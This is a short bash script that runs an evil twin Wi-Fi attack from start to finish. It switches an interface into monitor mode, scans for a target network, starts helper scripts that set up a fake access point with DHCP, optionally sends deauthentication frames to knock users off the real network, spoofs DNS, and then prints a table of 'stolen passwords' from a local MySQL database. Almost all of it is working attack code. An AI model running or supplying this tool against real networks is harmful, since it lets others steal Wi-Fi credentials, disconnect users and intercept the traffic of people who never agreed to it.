#!/bin/bash

sudo iwconfig
read -p "Please enter target interface: " INTERFACE

sudo ifconfig $INTERFACE down
sudo airmon-ng down $INTERFACE
sudo ifconfig $INTERFACE up
sudo airmon-ng start $INTERFACE

INTERFACE="${INTERFACE}mon"

xterm -e sudo airodump-ng $INTERFACE
read -p "Enter target BSSID: " BSSID
read -p "Enter target ESSID: " ESSID
read -p "Enter target channel: " CHANNEL

./create_fake_ap.sh $INTERFACE $BSSID $ESSID $CHANNEL
./setup_dhcp.sh
./create_evil_twin_services.sh

read -p "Would you like to de-authentication the users? yes/no " SHOULD_DEAUTHENTICATE

if [ $SHOULD_DEAUTHENTICATE = "yes" ]; then
  echo "Starting de-authentication"
  sudo aireplay-ng --deauth 10 -a $BSSID $INTERFACE
  echo "Finished de-authentication"
fi

sudo dnsspoof -i at0

echo "Finished Evil Twin Attack!"
echo "Stolen passwords table:"
echo "use rogue_AP;SELECT * FROM wpa_keys" | sudo mysql -u root
sudo airmon-ng stop $INTERFACE